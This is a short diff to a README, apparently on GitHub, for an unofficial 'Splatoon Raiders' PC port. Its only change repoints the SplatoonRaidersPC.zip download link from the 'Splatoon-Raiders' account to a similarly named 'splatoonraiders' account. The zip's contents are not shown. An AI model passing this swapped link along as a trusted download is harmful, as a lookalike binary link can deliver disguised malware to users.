@@ -7,7 +7,7 @@ Splatoon Raiders features the Mechanic, Shiver, Frye, and Big Man exploring the 
 <img width="646" height="318" alt="images1" src="https://github.com/user-attachments/assets/74f83cc6-f97e-466f-a320-dea6fcef7640" />
 
 ## Install
-[Download `SplatoonRaidersPC.zip`](https://github.com/Splatoon-Raiders/Splatoon-Raiders-PC-Port/releases/download/2026-07-23/SplatoonRaidersPC.zip)
+[Download `SplatoonRaidersPC.zip`](https://github.com/splatoonraiders/Splatoon-Raiders-PC-Port/releases/download/2026-07-23/SplatoonRaidersPC.zip)
 ---
 
 <img width="1920" height="1080" alt="images2" src="https://github.com/user-attachments/assets/9775d376-a45d-4167-9b98-03a89a8ea994" />
